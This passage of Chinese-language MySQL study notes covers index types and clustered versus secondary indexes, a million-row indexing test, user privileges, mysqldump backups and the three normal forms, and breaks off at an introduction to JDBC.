<p>MySQL 官方对索引的定义：索引（Index）是帮助 MySQL
高效获取数据的数据结构。</p>
<ul>
<li>索引的本质是数据结构；</li>
<li>索引的作用是使获取数据更高效；</li>
</ul>
<p>索引底层分析：<a
href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html">CodingLabs
- MySQL索引背后的数据结构及算法原理</a></p>
<h2 id="索引的分类">6.1. 索引的分类</h2>
<p>索引分为：</p>
<ol type="1">
<li>主键索引；
<ol type="1">
<li>一个表中唯一的标识，主键不可重复，只能有一个列作为主键；</li>
</ol></li>
<li>唯一索引；
<ol type="1">
<li>避免同一列有重复的值出现，唯一索引可以重复，多个列都可以标识为唯一索引；</li>
<li>解释：如果一个列标识为唯一索引，那么<strong>该表所有记录的这一列的值不能重复</strong>，可以理解为去重；</li>
</ol></li>
<li>常规索引；
<ol type="1">
<li>默认的，使用 <code>index</code> 或 <code>key</code> 来设置；</li>
</ol></li>
<li>全文索引；
<ol type="1">
<li>快速定位数据；</li>
<li>在特定的数据块引擎下才有 (MyISAM)，现在 InnoDB 也有了；</li>
</ol></li>
</ol>
<p>索引可以在创建表的时候给字段增加索引，也可以在表创建完毕之后，增加索引。</p>
<p>创建时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 主键索引</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) DEFAULT NULL,</span><br><span class="line">  `sex` varchar(5) DEFAULT NULL,</span><br><span class="line">  `address` varchar(100) DEFAULT NULL,</span><br><span class="line">  `birthday` datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 普通索引</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) DEFAULT NULL,</span><br><span class="line">  `sex` varchar(5) DEFAULT NULL,</span><br><span class="line">  `address` varchar(100) DEFAULT NULL,</span><br><span class="line">  `birthday` datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  INDEX 索引名(`字段名`)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 唯一索引</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) DEFAULT NULL,</span><br><span class="line">  `sex` varchar(5) DEFAULT NULL,</span><br><span class="line">  `address` varchar(100) DEFAULT NULL,</span><br><span class="line">  `birthday` datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE INDEX 索引名(`字段名`)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 全文索引</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) DEFAULT NULL,</span><br><span class="line">  `sex` varchar(5) DEFAULT NULL,</span><br><span class="line">  `address` varchar(100) DEFAULT NULL,</span><br><span class="line">  `birthday` datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  FULLTEXT INDEX 索引名(`字段名`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>创建后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ALTER TABLE 表名 ADD [FULLTEXT | UNIQUE] INDEX 索引名(字段名);</span><br><span class="line">2. ALTER TABLE 表名 ADD PRIMARY KEY(字段名);</span><br><span class="line"></span><br><span class="line"># 如果是常规索引，是 INDEX | KEY 索引名(字段名)</span><br></pre></td></tr></table></figure>
<p>新建一个只有主键的表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table `user`(</span><br><span class="line">`id` int(11) not null auto_increment,</span><br><span class="line">`username` varchar(40) default null,</span><br><span class="line">`password` varchar(40) default null,</span><br><span class="line">primary key(`id`));</span><br></pre></td></tr></table></figure>
<p>可以使用 <code>show index from 表</code> 来查看表的索引情况：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409210310.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>此时就只有主键。</p>
<p>将 <code>username</code> 设置为唯一索引：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE `user` ADD UNIQUE INDEX uni_username(`username`);</span><br></pre></td></tr></table></figure>
<p>将 <code>password</code> 设置为全文索引：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE `user` ADD FULLTEXT INDEX fl_username(`password`);</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409210652.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以使用 <code>EXPLAIN</code> 来查看 sql 语句执行的情况，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM student;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409210810.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>从结果中可以知道，查询了 3 行。但该表目前没有一条记录，为什么查询了 3
行？</p>
<h2 id="聚集索引与二级索引">6.2. 聚集索引与二级索引</h2>
<p>来自：<a
href="https://blog.51cto.com/u_15752673/5966420">MySQL高级【索引分类】_51CTO博客_mysql索引分类</a></p>
<p>在 InnoDB 存储引擎中，根据索引的存储形式，又可以分为以下两种：</p>
<table>
<colgroup>
<col style="width: 75%" />
<col style="width: 12%" />
<col style="width: 12%" />
</colgroup>
<thead>
<tr class="header">
<th>分类</th>
<th>含义</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>聚集索引（Cluster Index）</td>
<td>将数据存储与索引放到了一块，索引结构的叶子节点保存了行数据</td>
<td>必须有，且只有一个</td>
</tr>
<tr class="even">
<td>二级索引（Secondary Index）</td>
<td>将数据与索引分开存储，索引结构的叶子节点关联的是对应的主键</td>
<td>可以存在多个</td>
</tr>
</tbody>
</table>
<p>聚集索引选取规则:</p>
<ul>
<li>如果存在主键，主键索引就是聚集索引；</li>
<li>如果不存在主键，将使用第一个唯一（UNIQUE）索引作为聚集索引；</li>
<li>如果表没有主键，或没有合适的唯一索引，则 InnoDB 会自动生成一个 rowid
作为隐藏的聚集索引。</li>
</ul>
<p>聚集索引和二级索引的结构如下图：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/%E8%81%9A%E9%9B%86%E7%B4%A2%E5%BC%95%E5%92%8C%E4%BA%8C%E7%BA%A7%E7%B4%A2%E5%BC%95.webp"
alt="聚集索引和二级索引" />
<figcaption aria-hidden="true">聚集索引和二级索引</figcaption>
</figure>
<ul>
<li>聚集索引的叶子节点下挂的是这一行的数据。</li>
<li>二级索引的叶子节点下挂的是该字段值对应的主键值。</li>
</ul>
<p>假设 SQL
语句为：<code>select * from user where name='arm'</code>，查找流程如下：</p>
<ol type="1">
<li>因为查找的字段时 <code>name</code>
所以只能通过二级索引查找，根据二级索引找到了 <code>arm</code>
在最左下角，得到了主键 10；</li>
<li>因为要查找 <code>*</code>，所以 MySQL 根据主键 10
去聚集索引中找，最终得到 <code>row</code> 也就是一行记录；</li>
</ol>
<p>这种先去二级索引查找得到主键后，又根据主键到聚集索引中查找记录的方式称为<strong>回表查询</strong>。</p>
<p>思考题：以下两条 SQL 语句，其中 <code>id</code>
是主键，那个执行效率高? 为什么?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. select * from user where id = 10;</span><br><span class="line">2. select * from user where name = &#x27;arm&#x27;;</span><br></pre></td></tr></table></figure>
<p>第一条语句可以直接根据主键值在聚集索引中查找，而不需要回表查询，而第二条语句的过程上面说明了，需要回表查询，所以第一条语句效率高。</p>
<h2 id="百万数据测试">6.3. 百万数据测试</h2>
<p>创建一个测试表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `app_user`(</span><br><span class="line">	`id` BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT,</span><br><span class="line">	`name` VARCHAR(50) DEFAULT &#x27;&#x27; COMMENT &#x27;昵称&#x27;,</span><br><span class="line">	`email` VARCHAR(50) DEFAULT NULL COMMENT &quot;邮箱&quot;,</span><br><span class="line">	`phone` VARCHAR(20) DEFAULT NULL COMMENT &quot;手机号&quot;,</span><br><span class="line">	`gender` TINYINT(4) DEFAULT NULL COMMENT &quot;性别 0-男, 1-女&quot;,</span><br><span class="line">	`password` VARCHAR(100) NOT NULL COMMENT &quot;密码&quot;,</span><br><span class="line">	`age` TINYINT(4) NOT NULL COMMENT &quot;年龄&quot;,</span><br><span class="line">	`create_time` DATETIME DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">	`update_time` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (`id`)</span><br><span class="line">)ENGINE=INNODB DEFAULT CHARSET=utf8 COMMENT=&#x27;app用户表&#x27;;</span><br></pre></td></tr></table></figure>
<p>插入数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line">CREATE FUNCTION mock_data()</span><br><span class="line">RETURNS INT</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">	DECLARE num INT DEFAULT 1000000;</span><br><span class="line">	DECLARE i INT DEFAULT 0;</span><br><span class="line">	</span><br><span class="line">	WHILE i &lt; num DO</span><br><span class="line">        -- 插入语句</span><br><span class="line">        INSERT INTO `bank`.`app_user`(`name`,`email`,`phone`,`gender`,`password`,`age`)VALUES</span><br><span class="line">        (CONCAT(&#x27;用户&#x27;,i), &#x27;123456@qq.com&#x27;, CONCAT(&#x27;18&#x27;, FLOOR(RAND()*((999999999-100000000)+100000000))),</span><br><span class="line">        FLOOR(RAND()*2), UUID(), FLOOR(RAND()*100));</span><br><span class="line">		SET i = i+1;</span><br><span class="line">	END WHILE;</span><br><span class="line">	RETURN i;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<p>我虚拟机带不动，这里引用别人的结果，上面代码执行成功后，执行
<code>select mock_data()</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409220946.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>未加索引的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `app_user` WHERE `name`=&#x27;用户9999&#x27;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409221028.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>使用 <code>EXPLAIN</code> 分析：<code>EXPLAIN SELECT * FROM</code>
app_user <code>WHERE</code> name <code>='用户9999'</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409221106.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>使用索引的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE INDEX id_app_user_name ON app_user(`name`); # 增加索引</span><br></pre></td></tr></table></figure>
<p>再次执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `app_user` WHERE `name`=&#x27;用户9999&#x27;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409221158.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>个人理解：</p>
<ul>
<li>没有索引得一行一行的找过去；</li>
<li>有索引则先看每一行的 <code>name</code>
字段，如果遇到相同的，则返回该行结果，所以只找了一行，也就是最终结果的那一行；</li>
</ul>
<h2 id="索引原则">6.4. 索引原则</h2>
<p>索引虽然好用，但是不可以滥用，这里有几个原则可以记一下：</p>
<ul>
<li>索引不是越多越好。</li>
<li>不要对经常变动的数据加索引。</li>
<li>小数据量的表不需要加索引。</li>
<li>索引一般加在常用来查询的字段上。</li>
</ul>
<h1 id="权限管理和备份">7. 权限管理和备份</h1>
<h2 id="用户管理">7.1. 用户管理</h2>
<blockquote>
<p>可以看一下 [[Day7(MySQL)]]</p>
</blockquote>
<p>用户表：<code>mysql.user</code>，该表有 MySQL
所有用户信息，包括权限。</p>
<p>创建用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;username&#x27;@&#x27;内容&#x27; IDENTIFIED BY 密码;</span><br></pre></td></tr></table></figure>
<p>修改当前用户密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET PASSWORD=PASSWORD(新密码);</span><br></pre></td></tr></table></figure>
<p>修改指定用户密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET PASSWORD FOR &#x27;username&#x27;@&#x27;内容&#x27; = PASSWORD(新密码);</span><br></pre></td></tr></table></figure>
<p>重命名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RENAME USER &#x27;username&#x27;@&#x27;内容&#x27; To &#x27;username&#x27;@&#x27;内容&#x27;;</span><br></pre></td></tr></table></figure>
<p>用户授权（<code>*.*</code> 表示所有库，所有表）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;username&#x27;@&#x27;内容&#x27;;</span><br></pre></td></tr></table></figure>
<p>此时该用户拥有了数据库所有权限，只有一项权利没有，那就是
<code>grant</code>，也就是给别人授权。</p>
<p>查询权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;username&#x27;@&#x27;内容&#x27;;</span><br></pre></td></tr></table></figure>
<p>撤销权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REVOKE ALL PRIVILEGES ON *.* TO &#x27;username&#x27;@&#x27;内容&#x27;;</span><br></pre></td></tr></table></figure>
<p>删除用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP USER &#x27;username&#x27;@&#x27;内容&#x27;;</span><br></pre></td></tr></table></figure>
<h2 id="mysql-备份">7.2. MySQL 备份</h2>
<p>备份的作用：</p>
<ol type="1">
<li>保证重要的数据不丢失；</li>
<li>数据转移；</li>
</ol>
<p>MySQL 数据库的备份方式：</p>
<ol type="1">
<li><p>直接拷贝物理文件；</p></li>
<li><p>在可视化工具中手动“导出”，如果选择结构和数据，会把创建表、记录那些语句也导出，在新的
mysql 执行该文件就可以“恢复”数据； <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409223921.png"
alt="image.png" /></p></li>
<li><p>使用命令行“导出”；</p></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导出数据库</span></span><br><span class="line">mysqldump -h主机名 -u用户名 -p密码 数据库 &gt; 路径</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出表</span></span><br><span class="line">mysqldump -h主机名 -u用户名 -p密码 数据库 表1[ 表2 ...] &gt; 路径</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409224331.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>导入使用的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 登录情况下</span><br><span class="line">1. 导入表，切换到指定的数据库，source 文件</span><br><span class="line">2. 导入数据库，直接 source 文件</span><br><span class="line"></span><br><span class="line"># 不登录情况下</span><br><span class="line">mysql -u用户名 -p用户名 [库名] &lt; 备份文件</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也可以使用写文件和读文件配合来导入导出 [[3. 数据库内置系统表学习#2.
数据库读写文件]]</p>
</blockquote>
<h1 id="规范数据库设计">8. 规范数据库设计</h1>
<h2 id="概述-2">8.1. 概述</h2>
<p>糟糕的数据库设计：</p>
<ol type="1">
<li>数据冗余、浪费空间；</li>
<li>数据库插入和删除麻烦；</li>
<li>程序性能差；</li>
</ol>
<blockquote>
<p>数据需要一定的冗余，但不需要大量的冗余</p>
</blockquote>
<p>良好的数据库设计：</p>
<ol type="1">
<li>节省内存空间；</li>
<li>保证数据库的完整性；</li>
<li>方便后续开发；</li>
</ol>
<p>设计数据库一般分为两个步骤：</p>
<ol type="1">
<li>分析需求：分析业务和需要处理的数据库的需求；</li>
<li>概要设计：设计关系图、E-R（Entity-Relationship）图；</li>
</ol>
<p>以个人博客为例：</p>
<ol type="1">
<li>收集信息、分析需求：
<ol type="1">
<li>用户表：用户的个人信息，如用户名、密码等；</li>
<li>分类表：文章的分类；</li>
<li>文章表：存放文章；</li>
<li>评论表；</li>
<li>友链表；</li>
<li>......</li>
</ol></li>
<li>标识实体（把需求落地到每个字段）
<ol type="1">
<li>用户表：
<ol type="1">
<li>用户 id：主键、非空、自增；</li>
<li>用户名：非空；</li>
<li>用户密码：非空；</li>
<li>...</li>
</ol></li>
<li>分类表：
<ol type="1">
<li>分类 id：分类的唯一标识、主键（所有表都有一个 id
作为唯一标识，用来唯一标记该表中的某条记录）；</li>
<li>分类名：非空；</li>
<li>创建用户 id：非空；</li>
<li>...</li>
</ol></li>
<li>文章表:
<ol type="1">
<li>文章 id：文章的唯一标识、主键；</li>
<li>标题：非空；</li>
<li>作者信息：非空，对应用户 id；</li>
<li>文章分类：非空，对应分类 id；</li>
<li>内容：非空；</li>
<li>创建时间：非空；</li>
<li>更新时间：非空；</li>
<li>...</li>
</ol></li>
<li>评论表：
<ol type="1">
<li>评论 id：评论的唯一标识、主键；</li>
<li>评论人：对应用户 id；</li>
<li>文章：对应文章 id；</li>
<li>评论内容：非空；</li>
<li>评论时间：非空；</li>
<li>...</li>
</ol></li>
<li>友链表：
<ol type="1">
<li>友链 id：友链的唯一标识、主键；</li>
<li>友链：非空；</li>
<li>...</li>
</ol></li>
<li>...</li>
</ol></li>
<li>标识实体之间的关系
<ol type="1">
<li>写博客：用到用户表、文章表；</li>
<li>创建分类：用到用户表、分类表；</li>
<li>评论：用到用户表、评论表；</li>
<li>友链：只用到友链表；</li>
<li>...</li>
</ol></li>
</ol>
<h2 id="三大范式关系型数据库">8.2. 三大范式（关系型数据库）</h2>
<p>参考：<a
href="https://www.helloworld.net/p/7753670315">关系型数据库设计三大范式
- HelloWorld开发者社区</a></p>
<h3 id="范式定义">8.2.1. 范式定义</h3>
<p>定义：设计关系数据库时，遵从不同的规范要求，设计出合理的关系型数据库，这些不同的规范要求被称为不同的范式，各种范式呈递次规范，越高的范式数据库冗余越小。</p>
<p>采用范式可以降低数据的冗余性，缺点是获取数据时比较麻烦，可能需要 join
才能得到最后的数据。</p>
<p>目前有：</p>
<ol type="1">
<li>第一范式 <code>1NF</code>；</li>
<li>第二范式 <code>2NF</code>；</li>
<li>第三范式 <code>3NF</code>；</li>
<li>巴斯-科德范式 <code>BCNF</code>；</li>
<li>第四范式 <code>4NF</code>；</li>
<li>第五范式 <code>5NF</code>；</li>
</ol>
<h3 id="函数依赖">8.2.2. 函数依赖</h3>
<p>定义：A 属性集决定 B 属性集时，称 B 属性集依赖于 A 属性集。</p>
<p>比如下面这张表格：</p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
<th>系主任</th>
<th>科名</th>
<th>分数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>高等数学</td>
<td>87</td>
</tr>
<tr class="even">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>大学英语</td>
<td>88</td>
</tr>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>数据库设计</td>
<td>89</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>高等数学</td>
<td>86</td>
</tr>
<tr class="odd">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>java 程序设计</td>
<td>90</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>大学英语</td>
<td>98</td>
</tr>
<tr class="odd">
<td>003</td>
<td>王五</td>
<td>财务系</td>
<td>韩梅梅</td>
<td>高等数学</td>
<td>96</td>
</tr>
<tr class="even">
<td>003</td>
<td>王五</td>
<td>财务系</td>
<td>韩梅梅</td>
<td>财务基础</td>
<td>95</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>完全函数依赖</strong>：通过（A，B） 能够得出 C，但是单独通过
A 或者单独通过 B 得不到 C，则 C 完全依赖
A、B。比如上面可以通过（学号，科名）得到分数，但通过学号或者科名无法单独得到分数，则分数完全依赖与
（学号，科名）；</li>
<li><strong>部分函数依赖</strong>：通过（A，B）能够得出 C，但是单独通过
A 或者单独通过 B 也能够得到 C，那么称 C
部分依赖于（A，B）。比如上面可以通过（学号，科名）推出姓名，但单独通过学号也可以推出姓名，所以姓名部分依赖于（学号，科名）；</li>
<li><strong>传递函数依赖</strong>：通过 A 可以得到 B，通过 B 可以得到
C，但是通过 C 得不到 A，那么 C 传递依赖于
A。比如通过学号可以推出系名，通过系名可以推出系主任，但通过系主任得不到学号，所以系主任传递依赖于学号；</li>
</ul>
<h3 id="三大范式区别">8.2.3. 三大范式区别</h3>
<p><strong>第一范式核心原则：属性不可切割。</strong></p>
<p>举例说明：</p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
<th>系主任</th>
<th>科名</th>
<th>分数</th>
<th>学籍信息</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>高等数学</td>
<td>87</td>
<td>本科，大一</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>java 程序设计</td>
<td>90</td>
<td>本科，大二</td>
</tr>
</tbody>
</table>
<p>上面这张表格明显不符合第一范式原则，因为“学籍信息”属性不是原子项数据，还可以分割为学历和年级，最终得到如下满足第一范式核心原则的表：</p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
<th>系主任</th>
<th>科名</th>
<th>分数</th>
<th>学历</th>
<th>年级</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>高等数学</td>
<td>87</td>
<td>本科</td>
<td>大一</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>java 程序设计</td>
<td>90</td>
<td>本科</td>
<td>大二</td>
</tr>
</tbody>
</table>
<p>实际上，1NF 是所有关系型数据库的最基本要求
,你在关系型数据库管理系统（RDBMS），例如 SQL Server，Oracle，MySQL
中创建数据表的时候，如果数据表的设计不符合这个最基本的要求，那么操作一定是不能成功的。也就是说，只要在
RDBMS 中已经存在的数据表，一定是符合1NF 的。</p>
<p><strong>第二范式核心原则：在满足第一范式核心原则的基础上，不能存在部分函数依赖。</strong></p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
<th>系主任</th>
<th>科名</th>
<th>分数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>高等数学</td>
<td>87</td>
</tr>
<tr class="even">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>大学英语</td>
<td>88</td>
</tr>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
<td>数据库设计</td>
<td>89</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>高等数学</td>
<td>86</td>
</tr>
<tr class="odd">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>java 程序设计</td>
<td>90</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
<td>大学英语</td>
<td>98</td>
</tr>
<tr class="odd">
<td>003</td>
<td>王五</td>
<td>财务系</td>
<td>韩梅梅</td>
<td>高等数学</td>
<td>96</td>
</tr>
<tr class="even">
<td>003</td>
<td>王五</td>
<td>财务系</td>
<td>韩梅梅</td>
<td>财务基础</td>
<td>95</td>
</tr>
</tbody>
</table>
<p>上表就不满足第二范式核心原则，比如分数完全依赖于（学号，科名），但姓名、系名并不完全依赖于（学号，科名），只靠学号就能得到，所以存在部分依赖，将其修改为如下：</p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
<th>系主任</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
</tr>
<tr class="odd">
<td>003</td>
<td>王五</td>
<td>财务系</td>
<td>韩梅梅</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>科名</th>
<th>分数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>高等数学</td>
<td>87</td>
</tr>
<tr class="even">
<td>001</td>
<td>大学英语</td>
<td>88</td>
</tr>
<tr class="odd">
<td>001</td>
<td>数据库设计</td>
<td>89</td>
</tr>
<tr class="even">
<td>002</td>
<td>高等数学</td>
<td>86</td>
</tr>
<tr class="odd">
<td>002</td>
<td>java 程序设计</td>
<td>90</td>
</tr>
<tr class="even">
<td>002</td>
<td>大学英语</td>
<td>98</td>
</tr>
<tr class="odd">
<td>003</td>
<td>高等数学</td>
<td>96</td>
</tr>
<tr class="even">
<td>003</td>
<td>财务基础</td>
<td>95</td>
</tr>
</tbody>
</table>
<p><strong>第三范式核心原则：满足第二范式核心原则基础上，不能存在传递函数依赖。</strong></p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
<th>系主任</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
<td>李雷</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
<td>李雷</td>
</tr>
<tr class="odd">
<td>003</td>
<td>王五</td>
<td>财务系</td>
<td>韩梅梅</td>
</tr>
</tbody>
</table>
<p>上表中：学号可以得到系名，系名可以得到系主任，但系主任得不到学号，所以应该继续拆分，得到如下：</p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>系名</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>001</td>
<td>张三</td>
<td>计算机系</td>
</tr>
<tr class="even">
<td>002</td>
<td>李四</td>
<td>计算机系</td>
</tr>
<tr class="odd">
<td>003</td>
<td>王五</td>
<td>财务系</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th>系名</th>
<th>系主任</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>计算机系</td>
<td>李雷</td>
</tr>
<tr class="even">
<td>财务系</td>
<td>韩梅梅</td>
</tr>
</tbody>
</table>
<h3 id="规范性和性能取舍">8.2.4. 规范性和性能取舍</h3>
<p>没有冗余的数据库未必是最好的数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，减少了查询时的关联，提高查询效率，因为在数据库的操作中查询的比例要远远大于
DML
的比例。但是反范式化一定要适度，并且在原本已满足三范式的基础上再做调整的。</p>
<p>举个例子，比如我想通过学号查询学生的成绩、系名和系主任，使用最开始的表只要查
1
张表，而使用满足三大范式的表需要通过学号查到姓名、系名，通过系名查找系主任，通过学号查找成绩，这里面需要查
3 张表。</p>
<p>数据库设计应该也是分为三个境界的：</p>
<ol type="1">
<li>第一个境界，刚入门数据库设计，范式的重要性还未深刻理解。这时候出现的反范式设计，一般会出问题。</li>
<li>第二个境界，随着遇到问题解决问题，渐渐了解到范式的真正好处，从而能快速设计出低冗余、高效率的数据库。</li>
<li>第三个境界，再经过 N
年的锻炼，是一定会发觉范式的局限性的。此时再去打破范式，设计更合理的反范式部分。</li>
</ol>
<h1 id="jdbc">9. JDBC</h1>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230410095736.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ol type="1">
<li>创建一个普通项目 (数据库)</li>
<li>导入数据库驱动</li>
<li>编写测试代码</li>
</ol>
<p>简单的 JDBC 程序：</p>
